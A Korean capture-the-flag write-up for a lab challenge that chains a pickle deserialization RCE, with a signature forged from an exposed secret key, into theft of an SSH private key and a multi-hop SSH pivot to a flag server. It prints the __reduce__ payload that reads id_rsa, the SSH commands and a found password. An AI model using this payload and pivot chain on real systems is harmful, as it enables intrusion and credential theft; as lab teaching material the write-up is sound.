# 18. Pickle 역직렬화 RCE → SSH 다단계 피벗

## 문제 설명
`/process`가 사용자 입력을 pickle로 역직렬화하는 취약점에서 시작해,
서버의 SSH 키를 탈취하고 여러 내부 서버를 경유(pivot)하여 최종 flagserver의 flag를 읽는 문제.

공격 체인:
Pickle 역직렬화 RCE → `appuser` SSH 키 탈취 → SSH 접속 →
`intserver` 경유 → `flagserver` 접속 → flag.

## 분석

### 1) Pickle 역직렬화 RCE
`/process`는 `data`(base64 pickle)와 `signature`를 받아 서명 검증 후 역직렬화한다.
서명은 `md5(data + SECRET_KEY)`이고 `SECRET_KEY`는 소스에 노출되어 있어(`very_secret_key_do_not_guess`)
유효한 서명을 직접 만들 수 있다. `__reduce__`로 임의 명령을 실행해
`appuser`의 SSH 개인키(`/home/appuser/.ssh/id_rsa`)를 응답으로 유출한다.

```python
class ReadSshKey:
    def __reduce__(self):
        return (subprocess.getoutput, ("cat /home/appuser/.ssh/id_rsa",))
```

![pickle 페이로드로 SSH 키 유출](./images/20_pickle_key.png)

### 2) 유출한 키로 SSH 접속
유출한 키를 저장하고 권한을 `600`으로 맞춘 뒤 접속한다.
```
ssh -i id_rsa -o IdentitiesOnly=yes -p 2222 appuser@edu.arang.kr
```

![appuser 서버 접속](./images/21_appuser_shell.png)

### 3) 다단계 피벗 (appuser → intserver → flagserver)
`appuser` 홈의 `.ash_history`, `scp_transfer.sh`, `pw.txt`에서 내부 구조가 드러난다.
- `appuser`의 키로 `ctfuser@intserver` 접속 가능
- `flagserver`는 외부 비노출 → `intserver`를 ProxyJump로 경유
- `flaguser` 비밀번호: `secretpassword1!`

flagserver로 한 번에 접속:
```
ssh -o StrictHostKeyChecking=no -J ctfuser@intserver flaguser@flagserver
```

### 4) flag 획득
flagserver 홈에서 flag를 읽는다. (appuser 서버의 flag.txt는 `flag{dummy_flag_1}` 미끼)
```
cat flag.txt
```

![flagserver에서 진짜 flag 확인](./images/23_pivot_flag.png)

## 플래그
```
flag{d4f8482fa51b915c0754}
```
